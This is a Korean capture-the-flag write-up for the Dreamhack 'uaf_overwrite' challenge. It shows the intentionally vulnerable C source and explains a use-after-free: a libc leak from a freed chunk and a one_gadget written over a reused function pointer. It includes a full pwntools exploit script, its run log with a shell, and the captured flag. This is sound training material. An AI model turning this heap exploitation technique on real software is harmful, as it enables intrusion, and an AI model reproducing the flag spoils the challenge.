# ✏️ uaf_overwrite
https://dreamhack.io/wargame/challenges/357

## 📄 Vulnerability & Code Analysis
```c
  // Name: uaf_overwrite.c
  // Compile: gcc -o uaf_overwrite uaf_overwrite.c
  #include <stdio.h>
  #include <stdlib.h>
  #include <string.h>
  #include <unistd.h>

  struct Human {
    char name[16];
    int weight;
    long age;
  };

  struct Robot {
    char name[16];
    int weight;
    void (*fptr)();
  };

  struct Human *human;
  struct Robot *robot;
  char *custom[10];
  int c_idx;

  void print_name() { printf("Name: %s\n", robot->name); }

  void menu() {
    printf("1. Human\n");
    printf("2. Robot\n");
    printf("3. Custom\n");
    printf("> ");
  }

  void human_func() {
    int sel;
    human = (struct Human *)malloc(sizeof(struct Human));

    strcpy(human->name, "Human");
    printf("Human Weight: ");
    scanf("%d", &human->weight);

    printf("Human Age: ");
    scanf("%ld", &human->age);

    free(human);
  }

  void robot_func() {
    int sel;
    robot = (struct Robot *)malloc(sizeof(struct Robot));

    strcpy(robot->name, "Robot");
    printf("Robot Weight: ");
    scanf("%d", &robot->weight);

    if (robot->fptr)
      robot->fptr();
    else
      robot->fptr = print_name;

    robot->fptr(robot);

    free(robot);
  }

  int custom_func() {
    unsigned int size;
    unsigned int idx;
    if (c_idx > 9) {
      printf("Custom FULL!!\n");
      return 0;
    }

    printf("Size: ");
    scanf("%d", &size);

    if (size >= 0x100) {
      custom[c_idx] = malloc(size);
      printf("Data: ");
      read(0, custom[c_idx], size - 1);

      printf("Data: %s\n", custom[c_idx]);

      printf("Free idx: ");
      scanf("%d", &idx);

      if (idx < 10 && custom[idx]) {
        free(custom[idx]);
        custom[idx] = NULL;
      }
    }

    c_idx++;
  }

  int main() {
    int idx;
    char *ptr;

    setvbuf(stdin, 0, 2, 0);
    setvbuf(stdout, 0, 2, 0);

    while (1) {
      menu();
      scanf("%d", &idx);
      switch (idx) {
        case 1:
          human_func();
          break;
        case 2:
          robot_func();
          break;
        case 3:
          custom_func();
          break;
      }
    }
  }

```
주어진 소스 코드를 보면 `Human`과 `Robot` 구조체의 크기가 같고
`human_func`함수와 `robot_func` 에서 할당한 메모리 영역을 초기화하지 않으므로 UAF가 발생함

## 🗡️ Exploit / Solver Strategy
### 1. libc leak
```c
struct Human {
  char name[16];   // offset 0x00
  int weight;      // offset 0x10
  long age;        // offset 0x18
};
```
```c
struct Robot {
  char name[16];   // offset 0x00
  int weight;      // offset 0x10
 void (*fptr)();  // offset 0x18
};
```
그래서 human의 age에 `one_gadget` 주소를 넣고 free하면
나중에 같은 chunk를 Robot을 재사용할 때
robot -> fptr위치에 one_gadget 주소가 남게 됨

`robot_func()` 안에서는 Robot 구조체 malloc하고,
weight를 입력받을 뒤 robot -> fptr을 확인함
Human의 age에 one_gadget을 넣어두면, `robot->fptr == one_gadget`이 됨

`custom_func()`는 `size >= 0x100`일 때만 `malloc(size)`를 함

```python
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)

leak = custom(0x500, b'B', -1)
```
첫 번째 custom의 실제 의미는
```text
custom[0] = malloc(0x500)
custom[0]에 "AAAA" 입력
free idx = -1
```
상태를 정리하면
```text
custom[0] = 0x500 chunk, 사용 중
```
다음 custom의 실제 의미는 
```text
custom[1] = malloc(0x500)
custom[1]에 "AAAA" 입력
free idx = -1
```
상태를 정리하면
```text
custom[0] = 0x500 chunk, 사용 중
custom[1] = 0x500 chunk, 사용 중
```
세 번째 custom은
```text
custom[2] = malloc(0x500)
custom[2]에 "AAAA" 입력
free idx = 0
```
이므로 첫 번쨰로 만든 큰 chunk가 free된다.
따라서 첫 번째 chunck는 unsorted bin에 들어갈 수 있고 freed chunck에는 libc의 내부 주소가 남는다!!
```text
custom[0] chunk, freed
안쪽 데이터 부분에 libc 주소 흔적이 남음

custom[1] = 사용 중
custom[2] = 사용 중
```
따라서 4번째 custom에서 leak을 발생 시킨다.
즉, `malloc(0x500)`을 다시 하면 방금 free했던 `custom[0]` chunk가 재사용될 가능성이 높으므로
`b'B'` 1바이트를 보내서 chunck의 앞부분을 
```text
원래 freed chunk에 남아 있던 값:
?? ?? ?? ?? ?? ?? ?? ??

네가 b'B' 1바이트 입력 후:
42 ?? ?? ?? ?? ?? ?? ??
```
형태로 만들면 다음 프로그램에서 이를 출력한다.
```python
printf("Data: %s\n", custom[c_idx]);
```
따라서 
```python
libc_leak = u64(leak[:6].ljust(8, b'\x00'))
```
으로 처리하고 x86-64의 user space의 주소는 보통 하위 6바이트만 의미있고, 
상위 바이트는 `0x0000`으로 채워 8바이트 주소로 만들 수 있다.
따라서 libc_base를 계산하면
```python
libc_base = libc_leak - 0x3ebc42
```

### 2. one_gadget 주소 계산
```python
one_gadget = libc_base + 0x10a41c
```
`0x10a41c`는 해당 `libc-2.27.so` 안의 one_gadget offset   
즉, 
```text
실제 one_gadget 주소 = libc base + one_gadget offset
```
으로 one_gadget주소를 구한 다음
```python
human(1, one_gadget)
robot(1)
```
으로 함수 포인터 overwrite를 진행하면
```text
human->age 자리 == robot->fptr 자리
```
가 된다.

## 💻 Final Payload or Solver
```python
from pwn import *

p = remote('host3.dreamhack.games', 9570)
e = ELF('./uaf_overwrite')

def slog(sym, val):
    log.info(f'{sym} = {hex(val)}')

def human(weight, age):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', str(weight).encode())
    p.sendlineafter(b': ', str(age).encode())

def robot(weight):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', str(weight).encode())

def custom(size, data, idx):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', str(size).encode())
    p.sendafter(b': ', data)

    p.recvuntil(b'Data: ')
    leak = p.recvuntil(b'\nFree idx: ', drop=True)

    p.sendline(str(idx).encode())
    return leak

custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', -1)
custom(0x500, b'AAAA', 0)

leak = custom(0x500, b'B', -1)

log.info(f'raw leak = {leak}')

libc_leak = u64(leak[:6].ljust(8, b'\x00'))
libc_base = libc_leak - 0x3ebc42
one_gadget = libc_base + 0x10a41c

slog('libc_leak', libc_leak)
slog('libc_base', libc_base)
slog('one_gadget', one_gadget)

human(1, one_gadget)
robot(1)

p.interactive()
```

## 🏳️ cat flag
```powershell
(.venv) (base) ➜  uaf_overwrite pypwn uaf_overwrite.py
[▁] Opening connection to host3.dreamhack.games on port 9570: Trying 23.[+] Opening connection to host3.dreamhack.games on port 9570: Done
[*] '/home/daniel/dreamhack/pwn/uaf_overwrite/uaf_overwrite'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] raw leak = b'B\xac,\xb2O\x7f'
[*] libc_leak = 0x7f4fb22cac42
[*] libc_base = 0x7f4fb1edf000
[*] one_gadget = 0x7f4fb1fe941c
[*] Switching to interactive mode
$ cat flag
DH{130dbd07d09a0dc093c29171c7178545aa9641af8384fea4942d9952ed1b9acd}
[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to host3.dreamhack.games port 9570
```
